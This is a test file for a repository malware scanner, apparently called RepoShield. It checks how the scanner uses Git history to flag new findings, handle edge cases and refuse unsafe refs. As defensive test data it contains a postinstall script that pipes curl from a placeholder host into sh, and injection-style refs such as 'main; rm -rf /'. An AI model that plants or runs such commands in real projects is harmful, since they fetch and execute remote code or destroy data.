import { execFileSync } from "node:child_process";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { scan } from "../src/index.js";
import { parseAddedLines, isLineAdded, isSafeRef, GitRunner } from "../src/git/git.js";
import { commitAll, fixture, git, initRepo, project, snapshot, tmpDir, write } from "./helpers/project.js";

function repoWithBenignHistory(): string {
  const root = project({
    "src/app.js": fixture("benign/plain.js.txt"),
    "package.json": JSON.stringify({ name: "x", dependencies: { react: "^18.0.0" } }, null, 2),
  });
  initRepo(root);
  commitAll(root, "initial");
  return root;
}

describe("newly introduced findings", () => {
  it("marks uncommitted malicious code as new and leaves old findings alone", async () => {
    const root = repoWithBenignHistory();
    write(root, "src/loader.js", fixture("malicious/decode-exec.js.txt"));
    const r = await scan({ root });
    const f = r.findings.find((x) => x.ruleId === "RS-EXEC-002");
    expect(f?.newlyIntroduced).toBe(true);
    expect(f?.scoreFactors.map((x) => x.name)).toContain("newly-introduced");
    expect(r.summary.newFindings).toBeGreaterThan(0);
    expect(r.git.changedFiles).toEqual(["src/loader.js"]);
  });

  it("only marks the added lines of a modified file as new", async () => {
    const root = project({ "src/mix.js": `${fixture("malicious/shell-pipe.js.txt")}\n` });
    initRepo(root);
    commitAll(root, "old suspicious code");
    write(
      root,
      "src/mix.js",
      `${fixture("malicious/shell-pipe.js.txt")}\n{\n${fixture("malicious/download-exec.js.txt")}\n}\n`,
    );
    const r = await scan({ root });
    const old = r.findings.find((f) => f.ruleId === "RS-PROC-002");
    const added = r.findings.find((f) => f.ruleId === "RS-DL-001");
    expect(old?.newlyIntroduced).toBeUndefined();
    expect(added?.newlyIntroduced).toBe(true);
  });

  it("compares against a base ref across commits and escalates new findings in config files", async () => {
    const root = repoWithBenignHistory();
    const base = git(root, "rev-parse", "HEAD").trim();
    write(root, "vite.config.js", fixture("malicious/vite.config.js.txt"));
    commitAll(root, "add config");
    const r = await scan({ root, baseRef: base });
    expect(r.git.baseRef).toBe(base);
    const cfg = r.findings.find((f) => f.ruleId === "RS-CFG-001");
    expect(cfg?.newlyIntroduced).toBe(true);
    expect(cfg?.scoreFactors.map((x) => x.name)).toContain("severity-escalation");
    expect(cfg?.severity).toBe("high");
  });

  it("reports dependency changes and new lifecycle scripts relative to the base", async () => {
    const root = repoWithBenignHistory();
    write(
      root,
      "package.json",
      JSON.stringify(
        {
          name: "x",
          scripts: { postinstall: "curl http://x.invalid/a | sh" },
          dependencies: { react: "^18.0.0", "evil-dep": "git+https://x.invalid/e.git", expres: "^4" },
        },
        null,
        2,
      ),
    );
    const r = await scan({ root });
    const change = r.findings.find((f) => f.ruleId === "RS-DEP-003");
    expect(change?.severity).toBe("medium");
    expect(change?.evidence.join(" ")).toContain("evil-dep");
    expect(r.findings.find((f) => f.ruleId === "RS-PKG-001")?.newlyIntroduced).toBe(true);
  });
});

describe("changed mode", () => {
  it("scans only files changed relative to the base reference", async () => {
    const root = repoWithBenignHistory();
    write(root, "src/old-bad.js", fixture("malicious/shell-pipe.js.txt"));
    commitAll(root, "bad but committed");
    write(root, "src/new-bad.js", fixture("malicious/download-exec.js.txt"));
    const r = await scan({ root, mode: "changed", baseRef: "HEAD" });
    expect(r.findings.every((f) => f.file === "src/new-bad.js")).toBe(true);
    expect(r.summary.filesScanned).toBe(1);
    expect(r.safe).toBe(false);
  });

  it("falls back to a full scan with a note when Git is unavailable", async () => {
    const root = project({ "a.js": fixture("malicious/shell-pipe.js.txt") });
    const r = await scan({ root, mode: "changed" });
    expect(r.findings.length).toBeGreaterThan(0);
    expect(r.notes.join(" ")).toMatch(/requires a Git repository/);
  });
});

describe("Git edge cases", () => {
  it("handles a directory that is not a repository", async () => {
    const r = await scan({ root: project({ "a.js": "export {}" }) });
    expect(r.git.isRepository).toBe(false);
    expect(r.notes.join(" ")).toMatch(/Not a Git repository/);
  });

  it("handles a missing Git installation", async () => {
    const root = project({ "a.js": fixture("malicious/shell-pipe.js.txt") });
    const old = process.env["PATH"];
    process.env["PATH"] = "/nonexistent-reposhield-path";
    try {
      const r = await scan({ root });
      expect(r.git.available).toBe(false);
      expect(r.notes.join(" ")).toMatch(/not installed/i);
      expect(r.findings.length).toBeGreaterThan(0);
    } finally {
      process.env["PATH"] = old;
    }
  });

  it("handles a repository with no commits", async () => {
    const root = project({ "a.js": "export {}" });
    initRepo(root);
    const r = await scan({ root });
    expect(r.git.isRepository).toBe(true);
    expect(r.notes.join(" ")).toMatch(/no commits/i);
  });

  it("handles a detached HEAD and a missing baseRef gracefully", async () => {
    const root = repoWithBenignHistory();
    git(root, "checkout", "-q", "--detach");
    const r = await scan({ root, baseRef: "does-not-exist" });
    expect(r.git.detached).toBe(true);
    expect(r.notes.join(" ")).toMatch(/not found/);
  });

  it("handles a shallow clone", async () => {
    const origin = repoWithBenignHistory();
    write(origin, "x.txt", "2");
    commitAll(origin, "second");
    const dest = path.join(tmpDir(), "clone");
    execFileSync("git", ["clone", "-q", "--depth", "1", `file://${origin}`, dest], {
      stdio: "ignore",
      env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" },
    });
    const r = await scan({ root: dest, mode: "changed" });
    expect(r.git.shallow).toBe(true);
    expect(r.notes.join(" ")).toMatch(/Shallow clone/);
  });

  it("rejects option-like and malformed refs", async () => {
    expect(isSafeRef("--output=/tmp/x")).toBe(false);
    expect(isSafeRef("main; rm -rf /")).toBe(false);
    expect(isSafeRef("origin/main")).toBe(true);
    const root = repoWithBenignHistory();
    const r = await scan({ root, baseRef: "--output=/tmp/pwned" });
    expect(r.notes.join(" ")).toMatch(/unsafe baseRef/);
  });

  it("refuses to run any non-read-only git command", async () => {
    const root = repoWithBenignHistory();
    const g = new GitRunner(root);
    for (const sub of ["reset", "checkout", "commit", "push", "clean", "config", "gc", "fetch"]) {
      const res = await g.run([sub]);
      expect(res.ok).toBe(false);
      expect(res.code).toBe("EREFUSED");
    }
  });

  it("does not run repository hooks or fsmonitor commands", async () => {
    const root = repoWithBenignHistory();
    const marker = path.join(tmpDir(), "ran");
    write(root, ".git/hooks/post-checkout", `#!/bin/sh\ntouch ${marker}\n`);
    execFileSync("chmod", ["+x", path.join(root, ".git/hooks/post-checkout")]);
    git(root, "config", "core.fsmonitor", `touch ${marker}`);
    await scan({ root, baseRef: "HEAD" });
    expect((await import("node:fs")).existsSync(marker)).toBe(false);
  });

  it("does not modify the working tree, index, refs, or history while scanning", async () => {
    const root = repoWithBenignHistory();
    write(root, "src/loader.js", fixture("malicious/decode-exec.js.txt"));
    write(root, "package.json", JSON.stringify({ name: "x", scripts: { postinstall: "node a.js" } }));
    const before = snapshot(root);
    const status = git(root, "status", "--porcelain");
    await scan({ root, mode: "strict" });
    await scan({ root, mode: "changed" });
    expect(snapshot(root)).toBe(before);
    expect(git(root, "status", "--porcelain")).toBe(status);
  });
});

describe("diff parsing", () => {
  it("extracts added line ranges", () => {
    const m = parseAddedLines(
      "diff --git a/x.js b/x.js\n--- a/x.js\n+++ b/x.js\n@@ -1,0 +2,3 @@\n+a\n@@ -9 +12 @@\n+b\n",
    );
    const a = m.get("x.js");
    expect(a?.ranges).toEqual([
      [2, 4],
      [12, 12],
    ]);
    expect(isLineAdded(a, 3)).toBe(true);
    expect(isLineAdded(a, 5)).toBe(false);
  });
});
